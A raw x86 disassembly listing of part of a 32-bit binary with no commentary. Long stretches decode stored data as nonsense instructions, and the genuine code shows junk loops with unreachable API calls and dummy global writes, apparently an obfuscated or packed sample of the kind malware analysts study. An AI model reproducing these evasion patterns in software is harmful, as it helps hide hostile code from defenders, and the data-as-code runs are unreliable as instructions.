  406154:	and    eax,0x85b97e63
  406159:	je     0x406130
  40615b:	jmp    0x4060f4
  40615d:	scas   eax,DWORD PTR es:[edi]
  40615e:	push   edx
  40615f:	jg     0x40615d
  406161:	mov    bh,0xa6
  406163:	push   ds
  406164:	imul   eax,DWORD PTR [esi+0x137274e5],0xffffffa2
  40616b:	popw   ss
  40616d:	jmp    0x406144
  40616f:	scas   al,BYTE PTR es:[edi]
  406170:	ins    DWORD PTR es:[edi],dx
  406171:	popa   
  406172:	xchg   BYTE PTR [ecx-0x316c5a7e],bh
  406178:	je     0x4061e8
  40617a:	push   edi
  40617b:	dec    eax
  40617c:	inc    ebx
  40617d:	cmp    edi,DWORD PTR [esi-0x30]
  406180:	add    DWORD PTR [ebp+0x34f32bc1],0x628447ac
  40618a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40618b:	pop    ebx
  40618c:	popf   
  40618d:	cmc    
  40618e:	xchg   BYTE PTR [edi],cl
  406190:	fisub  WORD PTR [esp+eax*8-0x43]
  406194:	push   ebx
  406195:	jmp    0x40715f
  40619a:	and    DWORD PTR ds:0x412370,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412370
  4061af:	inc    edx
  4061b0:	mov    DWORD PTR ds:0x412370,edx
  4061b6:	cmp    DWORD PTR ds:0x412370,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412370,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41acf1
  4061d8:	push   0x41ac28
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x412364,0x11
  4061f7:	cmp    DWORD PTR ds:0x412364,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x412364,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x412364
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x412364,edi
  406234:	jmp    0x4061f7
  406239:	mov    edi,DWORD PTR [ebp-0x10]
  40623c:	or     DWORD PTR ds:0x41235c,0x6f22
  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4245b2,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
  406251:	adc    DWORD PTR ds:0x41abca,0x7639
  40625b:	xor    edx,eax
  40625d:	sbb    DWORD PTR ds:0x4245c2,0x415105
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41abda,0x19aa
  406273:	cmp    edi,edx
  406275:	mov    DWORD PTR ds:0x4150fd,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417e45
  406297:	or     DWORD PTR ds:0x417e3d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417e55,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41abe2,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41abd2,0x13
  4062cb:	cmp    DWORD PTR ds:0x41abd2,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41abd2,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41abd2
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41abd2,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41abce
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4245c6,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41abd2,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x412368,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415109,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417e59,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412370,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415111,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415111
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415111,ebx
  40638e:	cmp    DWORD PTR ds:0x415111,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415111,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx+0x1d9d4718],0x29
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x406382
  4063d4:	push   es
  4063d5:	xor    DWORD PTR [esi],edi
  4063d7:	jg     0x4063db
  4063d9:	ins    DWORD PTR es:[edi],dx
  4063da:	jecxz  0x40638b
  4063dc:	or     BYTE PTR [edx+0x3c],bh
  4063df:	push   ss
  4063e0:	adc    ecx,edx
  4063e2:	push   es
  4063e3:	ror    DWORD PTR [ecx],1
  4063e5:	out    dx,al
  4063e6:	clc    
  4063e7:	call   0xfc39:0xec01ea52
  4063ee:	es (bad) 
  4063f0:	fs ins BYTE PTR es:[edi],dx
  4063f2:	jae    0x4063eb
  4063f4:	test   BYTE PTR [ebx-0x7b],0x2
  4063f8:	mov    bl,0x2e
  4063fa:	lahf   
  4063fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063fc:	ins    BYTE PTR es:[edi],dx
  4063fd:	ins    DWORD PTR es:[edi],dx
  4063fe:	mov    al,0x23
  406400:	sub    DWORD PTR [esi+0x73],esp
  406403:	call   0xf32a3c20
  406408:	call   0x320b8efb
  40640d:	sbb    DWORD PTR [eax],0x55
  406410:	fnstsw WORD PTR [ebp+0x3b28f90c]
  406416:	mov    bh,0xa2
  406418:	jmp    0x406471
  40641a:	pop    esi
  40641b:	std    
  40641c:	in     al,0x94
  40641e:	jbe    0x406484
  406420:	test   BYTE PTR [edi+0x127aee1e],dl
  406426:	inc    esp
  406427:	xchg   esi,eax
  406428:	jge    0x4063bb
  40642a:	out    0xa4,al
  40642c:	cmp    eax,0x6a0522e5
  406431:	adc    eax,0xa1fd2c7
  406436:	push   0x26
  406438:	mov    dh,0xec
  40643a:	cmp    bh,BYTE PTR [edi]
  40643c:	xor    al,0x3d
  40643e:	fiadd  WORD PTR [esi+0x42ec9066]
  406444:	mov    ecx,0x5391002d
  406449:	xor    BYTE PTR [edx],cl
  40644b:	sbb    esi,DWORD PTR [edi+0x5b]
  40644e:	push   0x4f
  406450:	and    DWORD PTR [ecx],ebp
  406452:	mov    esp,0x19faefce
  406457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406458:	xchg   BYTE PTR [ecx+0x2be78e7e],ch
  40645e:	int    0x7
  406460:	and    ebx,DWORD PTR [edi+ebx*1+0x4e]
  406464:	lock jmp 0x40643d
  406467:	xchg   BYTE PTR [esi-0x5e],ah
  40646a:	(bad)  
  40646b:	imul   edx,DWORD PTR [ebx-0x32e6f838],0x45
  406472:	push   eax
  406473:	retf   0xb885
  406476:	cmp    al,0xc7
  406478:	lahf   
  406479:	call   0x78947e12
  40647e:	loope  0x40646c
  406480:	cmp    eax,DWORD PTR [eax+0x5b0436dd]
  406486:	cdq    
  406487:	jp     0x4064b3
  406489:	ins    BYTE PTR es:[edi],dx
  40648a:	inc    ebx
  40648b:	lods   eax,DWORD PTR ds:[esi]
  40648c:	inc    esi
  40648d:	sbb    DWORD PTR [ebp-0x23ac2f57],0x11
  406494:	popa   
  406495:	sbb    eax,0x8c7aed79
  40649a:	pop    edx
  40649b:	pop    edx
  40649c:	sub    DWORD PTR [edi+eiz*1-0x5848369d],esi
  4064a3:	in     eax,0x98
  4064a5:	mul    BYTE PTR [esi-0x592584b1]
  4064ab:	dec    eax
  4064ac:	xchg   ebp,eax
  4064ad:	mov    ds:0x225539ad,al
  4064b2:	rol    BYTE PTR [esi+0x3c],1
  4064b5:	mov    edi,0xa6d6d049
  4064ba:	xor    DWORD PTR [ecx+eiz*1+0x4a3bb04e],0x4b23cc86
  4064c5:	test   BYTE PTR [ebx],ch
  4064c7:	cmc    
  4064c8:	sbb    eax,ebp
  4064ca:	push   esi
  4064cb:	xlat   BYTE PTR ds:[ebx]
  4064cc:	xor    eax,0xecfd077f
  4064d1:	jnp    0x40650c
  4064d3:	xor    BYTE PTR [edx],bl
  4064d5:	(bad)  
  4064d6:	mov    ds:0xceb5fc7,al
  4064db:	jle    0x40647b
  4064dd:	sub    BYTE PTR [ecx*1+0x24cb9301],bl
  4064e4:	mov    ch,0xb2
  4064e6:	dec    eax
  4064e7:	fwait
  4064e8:	inc    edx
  4064e9:	data16 mov al,ds:0xf155c302
  4064ef:	jg     0x4064e7
  4064f1:	jecxz  0x4064bd
  4064f3:	(bad)  
  4064f4:	scas   eax,DWORD PTR es:[edi]
  4064f5:	jb     0x40648e
  4064f7:	mov    eax,ds:0xce8eba11
  4064fc:	rcl    edx,0xd7
  4064ff:	adc    eax,0x707a6cbb
  406504:	push   ebp
  406505:	dec    DWORD PTR [esi+eiz*1-0x6fc07cd]
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0x3e414057,edi
  406527:	xchg   esi,eax
  406528:	jmp    0x4064c9
  40652a:	or     eax,0x7f237e7e
  40652f:	jle    0x4065af
  406531:	or     al,BYTE PTR [ecx+esi*8]
  406534:	stc    
  406535:	outs   dx,BYTE PTR ds:[esi]
  406536:	pop    es
  406537:	das    
  406538:	enter  0x1d3f,0x31
  40653c:	arpl   WORD PTR [edi],cx
  40653e:	mov    edi,0x67152f1a
  406543:	mov    dh,0x99
  406545:	add    edx,ebp
  406547:	xchg   edi,eax
  406548:	sub    BYTE PTR [ebx+0x6d],cl
  40654b:	int    0xb
  40654d:	nop
  40654e:	outs   dx,BYTE PTR ds:[esi]
  40654f:	mov    fs:0x6f291146,eax
  406555:	mov    ah,0x39
  406557:	aaa    
  406558:	adc    al,0xd2
  40655a:	mov    bh,0xbb
  40655c:	and    BYTE PTR [ebp+0x40],al
  40655f:	(bad)  [ebx+0x46]
  406562:	adc    eax,0xd3617ad5
  406567:	fst    DWORD PTR [edi]
  406569:	pop    edi
  40656a:	cmp    DWORD PTR ds:0xfb1effef,edi
  406570:	stos   DWORD PTR es:[edi],eax
  406571:	call   0x7094:0x5663e3f6
  406578:	push   ds
  406579:	mov    al,ds:0x9207507
  40657e:	and    al,0xb7
  406580:	gs add al,0xfc
  406583:	adc    eax,0xe579f431
  406588:	je     0x406513
  40658a:	(bad)  
  40658b:	imul   BYTE PTR [ebp+eiz*4+0x55]
  40658f:	mov    ds:0x8568dcdd,eax
  406594:	lahf   
  406595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406596:	adc    BYTE PTR [esi-0x33ccf79a],ah
  40659c:	cld    
  40659d:	xor    al,0x91
  40659f:	pop    ds
  4065a0:	jb     0x406567
  4065a2:	or     DWORD PTR [esi+0x3b26dcd7],ebx
  4065a8:	mov    dl,0xf4
  4065aa:	cs sti 
  4065ac:	push   esp
  4065ad:	cmp    eax,0xe640566c
  4065b2:	inc    eax
  4065b3:	adc    eax,0x130df707
  4065b8:	inc    edx
  4065b9:	push   edx
  4065ba:	push   ss
  4065bb:	jae    0x406634
  4065bd:	inc    esi
  4065be:	push   0xfffffffc
  4065c0:	push   edx
  4065c1:	pop    edi
  4065c2:	addr16 fwait
  4065c4:	adc    BYTE PTR [ebp+0x74],bh
  4065c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065c8:	bound  esp,QWORD PTR [edi+ebp*4+0x1b]
  4065cc:	lds    ebx,FWORD PTR [ebx+eax*1+0x7f]
  4065d0:	jmp    0xef1044fc
  4065d5:	mov    eax,ds:0x74df5ce1
  4065da:	in     al,0xcc
  4065dc:	in     eax,0xeb
  4065de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065df:	push   esi
  4065e0:	inc    esp
  4065e1:	add    BYTE PTR [ebx],al
  4065e3:	pop    ds
  4065e4:	sbb    al,0x70
  4065e6:	mov    al,cl
  4065e8:	jno    0x40660c
  4065ea:	shr    BYTE PTR [ecx+0x70e05cd8],cl
  4065f0:	inc    ebp
  4065f2:	add    al,0xf2
  4065f4:	dec    esp
  4065f5:	clc    
  4065f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065f7:	push   edx
  4065f8:	inc    ecx
  4065f9:	repz xchg esp,eax
  4065fb:	pop    edi
  4065fc:	test   eax,0x1ab4d39e
  406601:	ins    BYTE PTR es:[edi],dx
  406602:	fdiv   st,st(5)
  406604:	popf   
  406605:	xchg   ebp,ebx
  406607:	in     al,0xb3
  406609:	or     BYTE PTR [ebx+0x6a],ch
  40660c:	scas   eax,DWORD PTR es:[edi]
  40660d:	push   esp
  40660e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40660f:	nop
  406610:	mov    ds:0x9e39d96,al
  406615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406616:	xor    ch,BYTE PTR [ecx+ebp*8]
  406619:	repnz (bad)
  40661c:	or     dh,ah
  40661e:	push   cs
  40661f:	fs (bad) 
  406621:	mov    esp,0x680abe1d
  406626:	loope  0x40664d
  406628:	xchg   esi,eax
  406629:	loope  0x4065d0
  40662b:	dec    edx
  40662c:	sbb    al,0x5d
  40662e:	inc    edi
  40662f:	addr16 into 
  406631:	sbb    al,cl
  406633:	lods   al,BYTE PTR ds:[esi]
  406634:	call   0x9487:0xae160ad1
  40663b:	and    DWORD PTR [esi-0x58],edx
  40663e:	inc    esp
  40663f:	out    0x79,eax
  406641:	sbb    eax,0x8509bb80
  406646:	inc    ebx
  406647:	jae    0x406698
  406649:	jb     0x406607
  40664b:	mov    dh,0x48
  40664d:	gs jo  0x40660a
  406650:	int    0xe2
  406652:	cmp    ecx,DWORD PTR gs:[ebx]
  406655:	repnz test eax,0x23e5da85
  40665b:	mov    edx,0x6295a73a
  406660:	jbe    0x40669d
  406662:	xchg   esp,eax
  406663:	or     esp,DWORD PTR [ecx-0x5c]
  406666:	mov    ebx,DWORD PTR [ebp-0x10]
  406669:	sub    ebx,edi
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	ds in  al,0xab
  40674b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40674c:	inc    eax
  40674d:	add    bh,BYTE PTR [esi+0x7e]
  406750:	and    edi,DWORD PTR [edi+0x7e]
  406753:	jle    0x40673c
  406755:	fcmovne st,st(0)
  406757:	cmp    edi,DWORD PTR [ecx-0x6017c540]
  40675d:	mov    dl,0xa0
  40675f:	call   0x2e9e:0x835291a6
  406766:	inc    ebx
  406767:	pop    ds
  406768:	js     0x4067c1
  40676a:	add    al,BYTE PTR [esi-0x70]
  40676d:	or     DWORD PTR [ecx+0x1ce63804],edi
  406773:	pcmpeqd mm7,QWORD PTR [di-0x5e]
  406778:	sbb    ah,BYTE PTR [ebp+eiz*2-0x67]
  40677c:	push   eax
  40677d:	test   DWORD PTR cs:[esp+edi*4+0x50c4a06f],esp
  406785:	imul   ebp,eax,0xffffff8a
  406788:	add    eax,0xe17a8d38
  40678d:	xchg   edx,eax
  40678e:	push   eax
  40678f:	imul   ecx,DWORD PTR [ecx-0xd],0x1e
  406793:	repnz mov ebx,0x20062cd9
  406799:	std    
  40679a:	inc    edx
  40679b:	int3   
  40679c:	imul   BYTE PTR [ecx+0x5d]
  40679f:	jmp    0x6b03:0xff37812d
  4067a6:	ds out dx,al
  4067a8:	pop    edi
  4067a9:	pusha  
  4067aa:	mov    bh,bh
  4067ac:	dec    esp
  4067ad:	sar    DWORD PTR [ebx],cl
  4067af:	sti    
  4067b0:	gs jbe 0x406830
  4067b3:	shl    BYTE PTR [edi+0x7d39048a],cl
  4067b9:	(bad)  
  4067ba:	and    ebx,DWORD PTR [ebp-0x19]
  4067bd:	xchg   edi,eax
  4067be:	xor    esi,edx
  4067c0:	or     al,0x5
  4067c2:	sbb    ebx,esi
  4067c4:	dec    esi
  4067c5:	pop    esi
  4067c6:	data16 (bad) 
  4067c9:	out    0x18,eax
  4067cb:	hlt    
  4067cc:	out    0xed,eax
  4067ce:	cmc    
  4067cf:	xchg   esi,eax
  4067d0:	or     eax,0xdc21ee0b
  4067d5:	and    esp,DWORD PTR [edx+0x4d]
  4067d8:	mov    edi,0x5fef0623
  4067dd:	call   0x62e2:0xd967f1f8
  4067e4:	imul   ecx,DWORD PTR [edx-0x19f35692],0xba9a9c3e
  4067ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067ef:	push   es
  4067f0:	jmp    0x406789
  4067f2:	and    al,0x0
  4067f4:	(bad)  
  4067f5:	fsincos 
  4067f7:	std    
  4067f8:	push   edi
  4067f9:	mov    eax,0xae602fc6
  4067fe:	mov    dl,0xb4
  406800:	pushf  
  406801:	mov    ecx,0xd43c196d
  406806:	inc    esp
  406807:	dec    edx
  406808:	outs   dx,DWORD PTR ds:[esi]
  406809:	data16 mov cl,0x52
  40680c:	outs   dx,DWORD PTR ds:[esi]
  40680d:	test   BYTE PTR [ecx+edx*4],dh
  406810:	cmp    ch,BYTE PTR [esp-0x71]
  406814:	adc    eax,DWORD PTR [edi]
  406816:	loopne 0x406844
  406818:	js     0x406831
  40681a:	adc    eax,0x6ee1bc22
  40681f:	mov    ebx,0x7059b624
  406824:	mov    dl,0xf7
  406826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406827:	sbb    al,ah
  406829:	push   0x8b7a425b
  40682e:	in     eax,0x4a
  406830:	cdq    
  406831:	xchg   ebp,eax
  406832:	retf   0xac36
  406835:	rol    BYTE PTR cs:[edx+0x320ddd9d],0xb3
  40683d:	inc    ecx
  40683e:	sar    BYTE PTR [esi-0x62206b69],cl
  406844:	xchg   ecx,eax
  406845:	xchg   esp,eax
  406846:	shl    BYTE PTR [ecx+0x7],1
  406849:	jno    0x406864
  40684b:	rol    BYTE PTR [ebx],1
  40684d:	ret    
  40684e:	mov    ds:0x9bf4a2df,al
  406853:	cmp    BYTE PTR [ebp+0x33fab7ba],cl
  406859:	inc    ecx
  40685a:	test   al,0xf9
  40685c:	sub    dh,al
  40685e:	rcl    DWORD PTR [edx+ecx*1-0xabfb882],1
  406865:	push   eax
  406866:	push   DWORD PTR [ecx+0x726a73c7]
  40686c:	adc    eax,0x2458462b
  406871:	(bad)  
  406872:	dec    esi
  406873:	xor    al,BYTE PTR [ebx+0x461415c]
  406879:	(bad)  
  40687b:	and    ch,BYTE PTR [esi+esi*4]
  40687e:	xor    eax,0x3e069dd3
  406883:	rcr    DWORD PTR ds:0x51cfa3be,cl
  406889:	add    edx,DWORD PTR [ebp-0x40]
  40688c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0xf8
  4068b9:	fs and al,0x29
  4068bc:	jne    0x4068be
  4068be:	jle    0x40693e
  4068c0:	and    edi,DWORD PTR [edi+0x7e]
  4068c3:	jle    0x406900
  4068c5:	gs stos DWORD PTR es:[edi],eax
  4068c7:	jns    0x406873
  4068c9:	mov    al,ds:0x8d3bb680
  4068ce:	ins    DWORD PTR es:[edi],dx
  4068cf:	xor    BYTE PTR ds:0x6ea22549,ch
  4068d5:	mov    ch,dl
  4068d7:	adc    eax,0xb65eeaed
  4068dc:	pop    esi
  4068dd:	pop    eax
  4068de:	push   ebx
  4068df:	fsubr  DWORD PTR [ecx-0x49]
  4068e2:	push   ebx
  4068e3:	pop    ss
  4068e4:	cmp    BYTE PTR [esi-0x497e7790],dh
  4068ea:	pop    edi
  4068eb:	cmp    eax,0xc8c55199
  4068f0:	xchg   esi,eax
  4068f1:	or     bl,dl
  4068f3:	mov    ss,WORD PTR [ebx]
  4068f5:	adc    DWORD PTR [ebx-0x6f2763ab],ecx
  4068fb:	js     0x406952
  4068fd:	fild   DWORD PTR gs:[esi]
  406900:	or     eax,0xeb1c4f03
  406905:	test   eax,0x28ff0e87
  40690a:	jnp    0x40693b
  40690c:	and    eax,DWORD PTR [edi+eax*4-0x1d38fafc]
  406913:	mov    edi,0x39e3f3df
  406918:	inc    ebx
  406919:	dec    esp
  40691a:	add    BYTE PTR [edi-0x11],0x30
  40691e:	push   cs
  40691f:	loopne 0x40692c
  406921:	xchg   esp,eax
  406922:	jecxz  0x4068e8
  406924:	retf   
  406925:	std    
  406926:	cdq    
  406927:	add    eax,0xc83217b5
  40692c:	mul    BYTE PTR [ebx]
  40692e:	jge    0x40692a
  406930:	pop    esi
  406931:	(bad)  
  406932:	mov    bh,0xa5
  406934:	push   ecx
  406935:	fcomi  st,st(1)
  406937:	repz dec esp
  406939:	adc    ebx,DWORD PTR gs:[edi]
  40693c:	mov    ch,0x5c
  40693e:	xchg   esp,eax
  40693f:	jno    0x406900
  406941:	test   ecx,esi
  406943:	mov    ecx,0xebf9b744
  406948:	mov    eax,0x40267c01
  40694d:	dec    ebx
  40694e:	cmp    BYTE PTR [eax+0x44],dl
  406951:	xor    DWORD PTR [ebp+0x52],esp
  406954:	xor    BYTE PTR [edx],dl
  406956:	xchg   esp,eax
  406957:	daa    
  406958:	jg     0x40696b
  40695a:	lock les ebp,FWORD PTR [ecx+0x500cec9a]
  406961:	loopne 0x406905
  406963:	loopne 0x406975
  406965:	sbb    eax,0xc5945ad
  40696a:	xchg   ecx,eax
  40696b:	addr16 push edx
  40696d:	mov    ds:0xeffcb6db,al
  406972:	mov    al,ds:0xa9dc62bd
  406977:	cmp    esp,DWORD PTR fs:[ebp+0x29]
  40697b:	jl     0x406939
  40697d:	aam    0xb2
  40697f:	sbb    al,0x88
  406981:	dec    edi
  406982:	sub    esi,DWORD PTR [ebx-0x158c8fde]
  406988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406989:	call   0x3197:0xdd0a92bd
  406990:	pop    es
  406991:	cmp    esi,DWORD PTR [edi]
  406993:	xchg   esi,eax
  406994:	mov    al,0x79
  406996:	xor    al,0x53
  406998:	xor    al,0x77
  40699a:	sahf   
  40699b:	icebp  
  40699c:	clc    
  40699d:	push   esp
  40699e:	or     al,0x2f
  4069a0:	mov    eax,ds:0x88a52ade
  4069a5:	(bad)  
  4069a6:	sbb    al,BYTE PTR [ebx-0x1c6b880a]
  4069ac:	ja     0x4069a6
  4069ae:	xchg   ecx,edi
  4069b0:	adc    BYTE PTR [eax],0x14
  4069b3:	sub    DWORD PTR [ebx-0x7a],edi
  4069b6:	aas    
  4069b7:	test   bl,0x65
  4069ba:	pop    ebx
  4069bb:	inc    ebp
  4069bc:	fldenv [edx]
  4069be:	arpl   WORD PTR [esi-0x666c93cc],dx
  4069c4:	aaa    
  4069c5:	xchg   ebx,eax
  4069c6:	mul    edx
  4069c8:	push   edi
  4069c9:	push   edi
  4069ca:	mov    esi,0xc58ded19
  4069cf:	mov    esi,0xe593ea42
  4069d4:	div    BYTE PTR [ebx-0x74]
  4069d7:	stos   DWORD PTR es:[edi],eax
  4069d8:	add    BYTE PTR fs:[ebx-0x4737893],cl
  4069df:	ret    0x1d18
  4069e2:	ret    0xaece
  4069e5:	pop    edi
  4069e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069e7:	mov    ah,BYTE PTR [ebp-0x69a3b649]
  4069ed:	(bad)  
  4069ef:	repnz gs push ebp
  4069f2:	cdq    
  4069f3:	xchg   esp,eax
  4069f4:	(bad)  
  4069f6:	jbe    0x4069d7
  4069f8:	and    BYTE PTR [ebx],dh
  4069fa:	shr    cl,1
  4069fc:	dec    ebp
  4069fd:	add    DWORD PTR [eax],eax
  4069ff:	add    ch,cl
  406a01:	sti    
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0x4b9a7a93
  406a0e:	and    eax,0x7e013e05
  406a13:	jle    0x406a38
  406a15:	jg     0x406a95
  406a17:	jle    0x40699e
  406a19:	loope  0x406a84
  406a1b:	pop    DWORD PTR [ecx-0x57]
  406a1e:	jl     0x406a59
  406a20:	xchg   esi,eax
  406a21:	mov    edx,0x87115ae7
  406a26:	jns    0x4069d4
  406a28:	scas   eax,DWORD PTR es:[edi]
  406a29:	dec    ebp
  406a2a:	mov    bl,0x47
  406a2c:	test   DWORD PTR [eax-0x73f07425],ecx
  406a32:	sbb    eax,0x256c9c82
  406a37:	cmp    al,0x11
  406a39:	addr16 pop edi
  406a3b:	inc    ecx
  406a3c:	popa   
  406a3d:	add    BYTE PTR [ecx+0xa],0xe7
  406a41:	mov    BYTE PTR [edx+0x32],al
  406a44:	adc    esp,edx
  406a46:	cld    
  406a47:	dec    ebp
